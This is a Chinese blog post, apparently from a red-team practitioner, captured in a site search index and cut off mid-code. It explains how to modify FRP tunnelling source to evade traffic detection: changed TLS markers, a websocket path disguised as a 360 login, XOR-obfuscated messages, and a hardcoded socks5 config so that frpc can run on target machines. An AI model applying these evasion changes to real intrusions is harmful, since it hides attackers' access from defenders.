<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>给FRP化化妆</title>
      <link href="/posts/f3a0015a.html"/>
      <url>/posts/f3a0015a.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://z3.ax1x.com/2021/05/14/grkwg1.gif"></p><a id="more"></a><h3 id="前置环境"><a href="#前置环境" class="headerlink" title="前置环境"></a>前置环境</h3><p>​    Platform：Kali Linux</p><p>​    Editor：IEDA（Golang）</p><p>​    Go Version：Go1.16</p><hr><p>​    下载master分支源码，建议通过git clone方式。IEDA打开。<a href="https://github.com/fatedier/frp/tree/master" target="_blank" rel="noopener">https://github.com/fatedier/frp/tree/master</a></p><p>注：以下使用的frp版本0.36.2的源码，其他版理论上也是可以用的。</p><h3 id="改改标识"><a href="#改改标识" class="headerlink" title="改改标识"></a>改改标识</h3><p>​    全局查找替换：`json:”</p><p><img src="https://z3.ax1x.com/2021/05/14/grkStH.png" alt="image-20210511015109411"></p><h3 id="修改默认加密salt"><a href="#修改默认加密salt" class="headerlink" title="修改默认加密salt"></a>修改默认加密salt</h3><p><code>cmd/frpc/main.go</code>、<code>cmd/frps/main.go</code></p><figure class="hljs highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>crypto.DefaultSalt = <span class="hljs-string">"sc.frp"</span><br>rand.Seed(time.Now().UnixNano())<br><br>sub.Execute()<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/05/14/grFv7D.png" alt="image-20210511003701463"></p><h3 id="修改tls协议默认特征"><a href="#修改tls协议默认特征" class="headerlink" title="修改tls协议默认特征"></a>修改tls协议默认特征</h3><p><code>pkg/util/net/tls.go</code> </p><p>​    不好截图，直接上代码：</p><figure class="hljs highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> net<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">"crypto/tls"</span><br><span class="hljs-string">"fmt"</span><br><span class="hljs-string">"net"</span><br><span class="hljs-string">"time"</span><br><br>gnet <span class="hljs-string">"github.com/fatedier/golib/net"</span><br>)<br><br><span class="hljs-keyword">var</span> (<br>FRPTLSHeadByte = <span class="hljs-number">0x10</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WrapTLSClientConn</span><span class="hljs-params">(c net.Conn, tlsConfig *tls.Config)</span> <span class="hljs-params">(out net.Conn)</span></span> &#123;<br>c.Write([]<span class="hljs-keyword">byte</span>&#123;<span class="hljs-keyword">byte</span>(FRPTLSHeadByte), <span class="hljs-keyword">byte</span>(<span class="hljs-number">0x61</span>), <span class="hljs-keyword">byte</span>(<span class="hljs-number">0x62</span>)&#125;)<br>out = tls.Client(c, tlsConfig)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">CheckAndEnableTLSServerConnWithTimeout</span><span class="hljs-params">(c net.Conn, tlsConfig *tls.Config, tlsOnly <span class="hljs-keyword">bool</span>, timeout time.Duration)</span> <span class="hljs-params">(out net.Conn, err error)</span></span> &#123;<br>sc, r := gnet.NewSharedConnSize(c, <span class="hljs-number">4</span>)<br>buf := <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">byte</span>, <span class="hljs-number">3</span>)<br><span class="hljs-keyword">var</span> n <span class="hljs-keyword">int</span><br>c.SetReadDeadline(time.Now().Add(timeout))<br>n, err = r.Read(buf)<br>c.SetReadDeadline(time.Time&#123;&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> n == <span class="hljs-number">3</span> &amp;&amp; <span class="hljs-keyword">int</span>(buf[<span class="hljs-number">0</span>]) == FRPTLSHeadByte &#123;<br>out = tls.Server(c, tlsConfig)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> tlsOnly &#123;<br>err = fmt.Errorf(<span class="hljs-string">"non-TLS connection received on a TlsOnly server"</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br>out = sc<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="修改websocket连接特征"><a href="#修改websocket连接特征" class="headerlink" title="修改websocket连接特征"></a>修改websocket连接特征</h3><p>​    这一步可忽略，就当前来说websocket不常用。</p><p><code>pkg/util/net/websocket.go</code> 19行：</p><figure class="hljs highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>FrpWebsocketPath = <span class="hljs-string">"/login/?src=pcw_home&amp;destUrl=https://www.360.cn"</span><br>)<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/05/14/grFzAe.png" alt="image-20210511004008468"></p><h3 id="WSS加域前置？"><a href="#WSS加域前置？" class="headerlink" title="WSS加域前置？"></a>WSS加域前置？</h3><p>​    改了编译不出来，全是报错？暂时放弃。</p><h3 id="修改读写逻辑，异或混淆字符"><a href="#修改读写逻辑，异或混淆字符" class="headerlink" title="修改读写逻辑，异或混淆字符"></a>修改读写逻辑，异或混淆字符</h3><p><code>pkg/msg/ctl.go</code></p><p>​    注：感觉原文 <a href="https://www.notion.so/FRP-d3673da19ec74a8781c020bbea883fa2" target="_blank" rel="noopener">https://www.notion.so/FRP-d3673da19ec74a8781c020bbea883fa2</a> 这部分的代码没给全，编译后的frp使用有问题，连接不了……   <strong>后面还是得用原来的，不做修改。</strong></p><figure class="hljs highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> msg<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">"io"</span><br><span class="hljs-string">"reflect"</span><br><br>jsonMsg <span class="hljs-string">"github.com/fatedier/golib/msg/json"</span><br>)<br><br><span class="hljs-keyword">type</span> Message = jsonMsg.Message<br><br><span class="hljs-keyword">var</span> (<br>msgCtl *jsonMsg.MsgCtl<br>xor= <span class="hljs-keyword">byte</span>(<span class="hljs-number">0xaa</span>)<br>typeMap = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-keyword">byte</span>]reflect.Type)<br>maxMsgLength <span class="hljs-keyword">int64</span> = <span class="hljs-number">10240</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">bytesXor</span><span class="hljs-params">(buffer []<span class="hljs-keyword">byte</span>)</span></span> &#123;<br><span class="hljs-keyword">for</span> i, v := <span class="hljs-keyword">range</span> buffer &#123;<br>buffer[i] = v ^ xor<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">readMsg</span><span class="hljs-params">(c io.Reader)</span> <span class="hljs-params">(typeByte <span class="hljs-keyword">byte</span>, buffer []<span class="hljs-keyword">byte</span>, err error)</span></span> &#123;<br>buffer = <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">byte</span>, <span class="hljs-number">1</span>)<br>_, err = c.Read(buffer)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>typeByte = buffer[<span class="hljs-number">0</span>] ^ xor<br><span class="hljs-keyword">if</span> _, ok := typeMap[typeByte]; !ok &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">var</span> _ <span class="hljs-keyword">int64</span><br>buffer = <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">byte</span>, <span class="hljs-number">8</span>)<br>c.Read(buffer)<br>bytesXor(buffer)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br>msgCtl = jsonMsg.NewMsgCtl()<br><span class="hljs-keyword">for</span> typeByte, msg := <span class="hljs-keyword">range</span> msgTypeMap &#123;<br>msgCtl.RegisterMsg(typeByte, msg)<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ReadMsg</span><span class="hljs-params">(c io.Reader)</span> <span class="hljs-params">(msg Message, err error)</span></span> &#123;<br>typeByte, buffer, err := readMsg(c)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">return</span> msgCtl.UnPack(typeByte, buffer)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ReadMsgInto</span><span class="hljs-params">(c io.Reader, msg Message)</span> <span class="hljs-params">(err error)</span></span> &#123;<br>_, buffer, err := readMsg(c)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">return</span> msgCtl.UnPackInto(buffer, msg)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WriteMsg</span><span class="hljs-params">(c io.Writer, msg <span class="hljs-keyword">interface</span>&#123;&#125;)</span> <span class="hljs-params">(err error)</span></span> &#123;<br>buffer, err := msgCtl.Pack(msg)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>bytesXor(buffer)<br><span class="hljs-keyword">if</span> _, err = c.Write(buffer); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="编译打包"><a href="#编译打包" class="headerlink" title="编译打包"></a>编译打包</h3><p>​    只编译当前平台frp：</p><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">rm -rf ./<span class="hljs-keyword">release</span>/packages<br>mkdir -p ./<span class="hljs-keyword">release</span>/packages<br><span class="hljs-keyword">go</span> <span class="hljs-keyword">build</span> -ldflags <span class="hljs-string">"-s -w"</span> -o ./<span class="hljs-keyword">release</span>/frpc ./cmd/frpc<br><span class="hljs-keyword">go</span> <span class="hljs-keyword">build</span> -ldflags <span class="hljs-string">"-s -w"</span> -o ./<span class="hljs-keyword">release</span>/frps ./cmd/frps<br></code></pre></td></tr></table></figure><p>交叉编译常用平台，以下只编译Win、Mac、Linux x86和x64。</p><p><code>package.sh</code></p><figure class="hljs highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># compile for version</span><br>make<br><span class="hljs-keyword">if</span> [ $? -ne 0 ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">"make error"</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br>frp_version=`./bin/frps --version`<br><span class="hljs-built_in">echo</span> <span class="hljs-string">"build version: <span class="hljs-variable">$frp_version</span>"</span><br><br>make -f ./Makefile.cross-compiles<br><br>rm -rf ./release/packages<br>mkdir -p ./release/packages<br><br>os_all=<span class="hljs-string">'linux windows darwin'</span><br>arch_all=<span class="hljs-string">'386 amd64'</span><br><br><span class="hljs-built_in">cd</span> ./release<br><br><span class="hljs-keyword">for</span> os <span class="hljs-keyword">in</span> <span class="hljs-variable">$os_all</span>; <span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">for</span> arch <span class="hljs-keyword">in</span> <span class="hljs-variable">$arch_all</span>; <span class="hljs-keyword">do</span><br>        frp_dir_name=<span class="hljs-string">"frp_<span class="hljs-variable">$&#123;frp_version&#125;</span>_<span class="hljs-variable">$&#123;os&#125;</span>_<span class="hljs-variable">$&#123;arch&#125;</span>"</span><br>        frp_path=<span class="hljs-string">"./packages/frp_<span class="hljs-variable">$&#123;frp_version&#125;</span>_<span class="hljs-variable">$&#123;os&#125;</span>_<span class="hljs-variable">$&#123;arch&#125;</span>"</span><br><br>        <span class="hljs-keyword">if</span> [ <span class="hljs-string">"x<span class="hljs-variable">$&#123;os&#125;</span>"</span> = x<span class="hljs-string">"windows"</span> ]; <span class="hljs-keyword">then</span><br>            <span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">"./frpc_<span class="hljs-variable">$&#123;os&#125;</span>_<span class="hljs-variable">$&#123;arch&#125;</span>.exe"</span> ]; <span class="hljs-keyword">then</span><br>                <span class="hljs-built_in">continue</span><br>            <span class="hljs-keyword">fi</span><br>            <span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">"./frps_<span class="hljs-variable">$&#123;os&#125;</span>_<span class="hljs-variable">$&#123;arch&#125;</span>.exe"</span> ]; <span class="hljs-keyword">then</span><br>                <span class="hljs-built_in">continue</span><br>            <span class="hljs-keyword">fi</span><br>            mkdir <span class="hljs-variable">$&#123;frp_path&#125;</span><br>            mv ./frpc_<span class="hljs-variable">$&#123;os&#125;</span>_<span class="hljs-variable">$&#123;arch&#125;</span>.exe <span class="hljs-variable">$&#123;frp_path&#125;</span>/frpc.exe<br>            mv ./frps_<span class="hljs-variable">$&#123;os&#125;</span>_<span class="hljs-variable">$&#123;arch&#125;</span>.exe <span class="hljs-variable">$&#123;frp_path&#125;</span>/frps.exe<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">"./frpc_<span class="hljs-variable">$&#123;os&#125;</span>_<span class="hljs-variable">$&#123;arch&#125;</span>"</span> ]; <span class="hljs-keyword">then</span><br>                <span class="hljs-built_in">continue</span><br>            <span class="hljs-keyword">fi</span><br>            <span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">"./frps_<span class="hljs-variable">$&#123;os&#125;</span>_<span class="hljs-variable">$&#123;arch&#125;</span>"</span> ]; <span class="hljs-keyword">then</span><br>                <span class="hljs-built_in">continue</span><br>            <span class="hljs-keyword">fi</span><br>            mkdir <span class="hljs-variable">$&#123;frp_path&#125;</span><br>            mv ./frpc_<span class="hljs-variable">$&#123;os&#125;</span>_<span class="hljs-variable">$&#123;arch&#125;</span> <span class="hljs-variable">$&#123;frp_path&#125;</span>/frpc<br>            mv ./frps_<span class="hljs-variable">$&#123;os&#125;</span>_<span class="hljs-variable">$&#123;arch&#125;</span> <span class="hljs-variable">$&#123;frp_path&#125;</span>/frps<br>        <span class="hljs-keyword">fi</span>  <br>        cp ../LICENSE <span class="hljs-variable">$&#123;frp_path&#125;</span><br>        cp -rf ../conf/* <span class="hljs-variable">$&#123;frp_path&#125;</span><br><br>        <span class="hljs-comment"># packages</span><br>        <span class="hljs-built_in">cd</span> ./packages<br>        <span class="hljs-keyword">if</span> [ <span class="hljs-string">"x<span class="hljs-variable">$&#123;os&#125;</span>"</span> = x<span class="hljs-string">"windows"</span> ]; <span class="hljs-keyword">then</span><br>            zip -rq <span class="hljs-variable">$&#123;frp_dir_name&#125;</span>.zip <span class="hljs-variable">$&#123;frp_dir_name&#125;</span><br>        <span class="hljs-keyword">else</span><br>            tar -zcf <span class="hljs-variable">$&#123;frp_dir_name&#125;</span>.tar.gz <span class="hljs-variable">$&#123;frp_dir_name&#125;</span><br>        <span class="hljs-keyword">fi</span>  <br>        <span class="hljs-built_in">cd</span> ..<br>        rm -rf <span class="hljs-variable">$&#123;frp_path&#125;</span><br>    <span class="hljs-keyword">done</span><br><span class="hljs-keyword">done</span><br><br><span class="hljs-built_in">cd</span> -<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/05/14/grkC9A.png" alt="image-20210511181953839"></p><figure class="hljs highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">zsh ./package.sh<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/05/14/grkP1I.png" alt="image-20210511182350685"></p><h3 id="后续1-把配置写入源码食用方式"><a href="#后续1-把配置写入源码食用方式" class="headerlink" title="后续1:把配置写入源码食用方式"></a>后续1:把配置写入源码食用方式</h3><p>​    通常情况frp的运行程序要跟连接配置文件 <code>frpc/s.ini</code>一起传到目标机上运行。在某些情况下，如HVV时，可能会被其他师傅直接反日。 为了防止或者减少被直接”反打”，把配置写死在代码中可以在一定程度上避免泄露配置信息。</p><p>frpc.ini</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[common]<br>server_addr = 192.168.176.128<br>server_port = 6666<br>token = U2VjZGUwIA0K<br>tls_enable = <span class="hljs-literal">true</span><br>[http_proxy]<br><span class="hljs-built_in">type</span> = tcp<br>remote_port = 23333<br>plugin = socks5<br>plugin_user = Secde0<br>plugin_passwd = Swcde0!<br>use_encryption = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>要修改这几个文件：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">cmd&#x2F;frpc&#x2F;sub&#x2F;root.go<br>cmd&#x2F;frpc&#x2F;sub&#x2F;status.go<br>cmd&#x2F;frpc&#x2F;sub&#x2F;reload.go<br></code></pre></td></tr></table></figure><h4 id="改root-go"><a href="#改root-go" class="headerlink" title="改root.go"></a>改<code>root.go</code></h4><p>​    在var()中新建个变量保存配置内容：</p><figure class="hljs highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go">fileContent = <span class="hljs-string">`</span><br><span class="hljs-string">[common]</span><br><span class="hljs-string">server_addr = 192.168.176.128</span><br><span class="hljs-string">server_port = 6666</span><br><span class="hljs-string">token = U2VjZGUwIA0K</span><br><span class="hljs-string">tls_enable = true</span><br><span class="hljs-string">[http_proxy]</span><br><span class="hljs-string">type = tcp</span><br><span class="hljs-string">remote_port = 23333</span><br><span class="hljs-string">plugin = socks5</span><br><span class="hljs-string">plugin_user = Secde0</span><br><span class="hljs-string">plugin_passwd = Swcde0!</span><br><span class="hljs-string">use_encryption = true</span><br><span class="hljs-string">`</span><br></code></pre></td></tr></table></figure><h4 id="改status-go"><a href="#改status-go" class="headerlink" title="改status.go"></a>改<code>status.go</code></h4><p>​    注释 41~45行，把 <code>fileContent</code>赋值给<code>iniContent</code> ，注意要转为<code>byte</code></p><figure class="hljs highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> statusCmd = &amp;cobra.Command&#123;<br>Use:   <span class="hljs-string">"status"</span>,<br>Short: <span class="hljs-string">"Overview of all proxies status"</span>,<br>RunE: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(cmd *cobra.Command, args []<span class="hljs-keyword">string</span>)</span> <span class="hljs-title">error</span></span> &#123;<br><span class="hljs-comment">//iniContent, err := config.GetRenderedConfFromFile(cfgFile)</span><br><span class="hljs-comment">//if err != nil &#123;</span><br><span class="hljs-comment">//fmt.Println(err)</span><br><span class="hljs-comment">//os.Exit(1)</span><br><span class="hljs-comment">//&#125;</span><br>iniContent := fileContent<br><br>clientCfg, err := parseClientCommonCfg(CfgFileTypeIni, []<span class="hljs-keyword">byte</span>(iniContent))<br>.......<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;,<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/05/14/grkEB8.png" alt="image-20210512015012841"></p><h4 id="改reload-go"><a href="#改reload-go" class="headerlink" title="改reload.go"></a>改<code>reload.go</code></h4><p>注释 37~41行，把 <code>fileContent</code>赋值给<code>iniContent</code> ，注意要转为<code>byte</code></p><figure class="hljs highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> reloadCmd = &amp;cobra.Command&#123;<br>Use:   <span class="hljs-string">"reload"</span>,<br>Short: <span class="hljs-string">"Hot-Reload frpc configuration"</span>,<br>RunE: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(cmd *cobra.Command, args []<span class="hljs-keyword">string</span>)</span> <span class="hljs-title">error</span></span> &#123;<br><span class="hljs-comment">//iniContent, err := config.GetRenderedConfFromFile(cfgFile)</span><br><span class="hljs-comment">//if err != nil &#123;</span><br><span class="hljs-comment">//fmt.Println(err)</span><br><span class="hljs-comment">//os.Exit(1)</span><br><span class="hljs-comment">//&#125;</span><br>iniContent := fileContent<br><br>clientCfg, err := parseClientCommonCfg(CfgFileTypeIni, []<span class="hljs-keyword">byte</span>(iniContent))<br>........<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;,<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/05/14/grkAnf.png" alt="image-20210512015110274"></p><p>再回到<code>root.go</code> 文件<code>runClient</code>方法，注释198行（未改动时应该在184行），然后新增一行：</p><figure class="hljs highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">content, err = []<span class="hljs-keyword">byte</span>(fileContent), <span class="hljs-literal">nil</span><br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/05/14/grkFjP.png" alt="image-20210512015955784"></p><p>重新编译，运行：</p><p><img src="https://z3.ax1x.com/2021/05/14/grkeAg.png" alt="image-20210512021538506"></p><p><img src="https://z3.ax1x.com/2021/05/14/grkVHS.png" alt="image-20210512021920839"></p><h3 id="后续2-通过参数传入食用方法"><a href="#后续2-通过参数传入食用方法" class="headerlink" title="后续2:通过参数传入食用方法"></a>后续2:通过参数传入食用方法</h3><p>​    参照 <a href="https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html" target="_blank" rel="noopener">https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html</a>  【frpc.ini的ip通过参数传入】中的步骤进行修改。</p><p>​    <strong>注</strong>：需要使用<code>Jack-Kingdom</code>提供源码进行修改，不能使用官方的，否则无法编译？</p><p>Changfrp：<code>https://github.com/Jack-Kingdom/frp/tree/4a5c9a8796701472037c979b467c6a9ea449fd62</code></p><h4 id="定义传参"><a href="#定义传参" class="headerlink" title="定义传参"></a>定义传参</h4><p>​    编辑<code>cmd/frpc/root.go</code></p><p>​    在 <code>var()</code>中创建4个变量，然后修改 <code>init() </code> 方法，传参：</p><figure class="hljs highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">rootCmd.PersistentFlags().StringVarP(&amp;ip, <span class="hljs-string">"server_addr"</span>, <span class="hljs-string">"t"</span>, <span class="hljs-string">""</span>, <span class="hljs-string">"server_addr"</span>)<br>rootCmd.PersistentFlags().StringVarP(&amp;port, <span class="hljs-string">"server_port"</span>, <span class="hljs-string">"p"</span>, <span class="hljs-string">""</span>, <span class="hljs-string">"server_port"</span>)<br>rootCmd.PersistentFlags().StringVarP(&amp;fport, <span class="hljs-string">"remote_port"</span>, <span class="hljs-string">"f"</span>, <span class="hljs-string">""</span>, <span class="hljs-string">"remote_port"</span>)<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/05/14/grkK9s.png" alt="image-20210513160922457"></p><h4 id="创建存放配置信息的方法"><a href="#创建存放配置信息的方法" class="headerlink" title="创建存放配置信息的方法"></a>创建存放配置信息的方法</h4><p>​    编辑：<code>cmd/frpc/sub/root.go</code>  ，新增 <code>getFileContent</code>函数：</p><figure class="hljs highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getFileContent</span><span class="hljs-params">(ip <span 